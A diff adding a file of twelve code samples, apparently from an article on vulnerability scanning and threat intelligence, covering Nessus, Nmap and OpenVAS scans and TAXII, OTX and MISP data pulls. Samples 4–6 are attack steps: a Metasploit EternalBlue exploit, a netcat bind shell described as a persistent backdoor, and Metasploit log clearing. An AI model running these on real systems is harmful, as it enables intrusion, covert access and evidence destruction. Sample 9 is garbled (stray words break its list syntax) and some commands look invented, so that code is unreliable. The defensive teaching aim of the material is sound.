@@ -1,0 +1,179 @@
+Code Sample 1:-
+
+# Automating Nessus Scan
+
+	import requests
+	
+	# Nessus server details
+	url = "https://your-nessus-server:8834"
+	headers = {"Content-Type": "application/json"}
+	
+	# Authenticate with Nessus
+	auth_payload = {"username": "admin", "password": "password"}
+	auth_response = requests.post(url + "/session", json=auth_payload, headers=headers)
+	
+	token = auth_response.json()["token"]
+	headers["X-Cookie"] = f"token={token}"
+	
+	# Launch a scan
+	scan_payload = {
+	    "uuid": "your-scan-template-uuid",
+	    "settings": {
+	        "name": "Sample Vulnerability Scan",
+	        "text_targets": "192.168.1.1",
+	        "launch_now": True
+	    }
+	}
+	scan_response = requests.post(url + "/scans", json=scan_payload, headers=headers)
+	
+	# Output the scan ID for tracking
+	print(scan_response.json()["scan"]["id"])
+
+
+Code Sample 2:-
+
+# Nmap reconnaissance command (bash code):
+
+	Scanning a target's network to find live hosts and open ports
+	nmap -A -T4 192.168.1.1/24
+
+Code Sample 3:-
+
+# Vulnerability scanning command using OpenVAS:
+
+	Running a full and fast vulnerability scan on a particular IP range
+	openvas-cli --target=192.168.1.1 --scan-type=full-and-fast
+
+
+Code Sample 4:-
+
+# Exploiting a vulnerability using Metasploit:
+
+	Exercising an exploit on a vulnerability in Windows to gain access
+	msfconsole -q
+	use exploit/windows/smb/ms17_010_eternalblue
+	set RHOSTS 192.168.1.1
+	run
+
+
+Code Sample 5:- 
+
+# Creating a persistent backdoor: 
+
+	# Set up a backdoor on a compromised machine using netcat
+	nc -lvp 4444 -e /bin/bash
+
+
+Code Sample 6:- 
+
+# Clearing logs with Metasploit's clearev module: 
+
+	Using Metasploit to Clear Event Logs on a Windows System
+	use post/windows/manage/clearev
+	set SESSION 1
+	run
+
+
+Code Sample 7:-
+
+# Collecting Threat Data
+
+	Example of collecting threat data from a TAXII server
+	from taxii2client.v20 import Server
+	
+	Connect with a TAXII server and fetch threat data
+	
+	server = Server("https://example.com/taxii/")
+	collection = server.api_roots[0].collections[0]
+	data = collection.get_objects()
+	print(data)
+
+
+Code Sample 8:-
+
+# Processing Collected Data
+
+	Example of processing collected data using Python normalizing and filtering
+	data = [
+	 {"ip": "192.168.1.1", "threat": "low"},
+	 {"ip": "10.0.0.1", "threat": "high"}
+	]
+	
+	# Process only high-threat indicators
+	processed_data = [entry for entry in data if entry['threat'] == 'high']
+	print(processed_data)
+
+
+Code Sample 9:-
+
+# Analyzing data for identifying IOCs
+
+	# Example of analyzing data to identify critical indicators of compromise (IoCs)
+	ioc_data = [{ "hash": "abc123", "type": "malware"} mafia {"ip": "192.168.1.1", "type": "suspicious"} mafia
+	
+	Analyze, extract malware IoCs
+	malware_iocs = [ioc for ioc in ioc_data if ioc['#type'] == 'malware']
+	print(malware_iocs)
+
+
+Code Sample 10:- 
+
+# Pull threat intelligence from OTX python copy code import requests
+
+	import requests
+	
+	# AlienVault OTX API endpoint and key
+	otx_api_url = "https://otx.alienvault.com/api/v1/indicators"
+	api_key = "your_api_key"
+	
+	# Query OTX for vulnerabilities
+	response = requests.get(otx_api_url + "/vuln?apikey=" + api_key)
+	vulnerabilities = response.json()
+	
+	# Display relevant vulnerabilities
+	for vuln in vulnerabilities:
+	    print(f"Vulnerability: {vuln['title']} - {vuln['description']}")
+
+
+Code Sample 11:- 
+
+# prioritizing vulnerabilities using threat intelligence
+
+	import requests
+	def prioritize_vulnerabilities(vulnerabilities, threat_data):
+	    for vuln in vulnerabilities:
+	        if vuln['cve'] in threat_data['active_exploits']:
+	            print(f"Critical: {vuln['cve']} is actively exploited")
+	        else:
+	            print(f"Low priority: {vuln['cve']} is not currently exploited")
+	
+	# Example of integrating vulnerability scanning with threat intelligence
+	vulnerabilities = [{"cve": "CVE-2023-1234"}, {"cve": "CVE-2022-5678"}]
+	threat_data = {"active_exploits": ["CVE-2023-1234"]}
+	
+	prioritize_vulnerabilities(vulnerabilities, threat_data)
+
+
+Code Sample 12:- 
+
+# pulling relevant threat data for vulnerabilities based on CVE identifiers
+
+	import requests
+	
+	# MISP API setup
+	url = "https://misp-instance/api/attributes/restSearch"
+	headers = {
+	    "Authorization": "your_api_key",
+	    "Content-Type": "application/json"
+	}
+	payload = {
+	    "searchall": "CVE-2023-1234"
+	}
+	
+	# Request threat data related to a specific CVE
+	response = requests.post(url, json=payload, headers=headers)
+	threat_data = response.json()
+	
+	# Display results
+	for attribute in threat_data['response']['Attribute']:
+	    print(f"Attribute: {attribute['value']} - {attribute['type']}")
